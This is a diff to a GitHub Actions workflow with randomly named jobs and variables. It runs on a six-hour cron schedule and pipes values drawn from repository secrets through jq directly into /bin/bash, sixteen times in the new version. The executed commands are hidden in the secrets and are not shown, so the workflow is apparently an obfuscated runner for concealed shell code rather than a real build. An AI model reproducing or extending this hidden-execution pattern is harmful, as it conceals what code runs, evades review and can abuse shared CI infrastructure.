@@ -1,8 +1,9 @@
 name: lishuhuan4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 2/6 * * *'
+    - cron: '22 2/6 * * *'
 
 jobs:
   build:
@@ -12,13 +13,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: lishuhuan4567
         env:
-          dit8200: ${{ secrets.dit8200 }}
+          ub51: ${{ secrets.ub51 }}
         run: |
-          echo $dit8200 | jq -r .q99 | /bin/bash
-          echo $iwkje329 | jq -r .eadc32 | /bin/bash
-          echo $qsoo1018 | jq -r .fj756 | /bin/bash
-          echo $eup745 | jq -r .xbwrv306 | /bin/bash
-          echo $fm31830 | jq -r .h3759 | /bin/bash
-          echo $mlea55474 | jq -r .hiyxi9 | /bin/bash
-          echo $nvqdc67900 | jq -r .pp808 | /bin/bash
+          echo $ub51 | jq -r .thnac46 | /bin/bash
+          echo $ym40929 | jq -r .mbaay78 | /bin/bash
+          echo $i330 | jq -r .boro305 | /bin/bash
+          echo $zo824 | jq -r .bcz22230 | /bin/bash
+          echo $by638 | jq -r .fzrua16 | /bin/bash
+          echo $rvxqm0 | jq -r .yhnv22 | /bin/bash
+          echo $jybuk1750 | jq -r .dlt1716 | /bin/bash
+          echo $qeq43 | jq -r .lhlbr635 | /bin/bash
+          echo $g5916 | jq -r .jioe30776 | /bin/bash
+          echo $ay2 | jq -r .cpvx17869 | /bin/bash
+          echo $g50 | jq -r .urpij66 | /bin/bash
+          echo $cotax97028 | jq -r .hzlpl201 | /bin/bash
+          echo $g38 | jq -r .fsoay9298 | /bin/bash
+          echo $ep2 | jq -r .h00 | /bin/bash
+          echo $y32615 | jq -r .gdkf758 | /bin/bash
+          echo $ky4385 | jq -r .pkiu3422 | /bin/bash
 
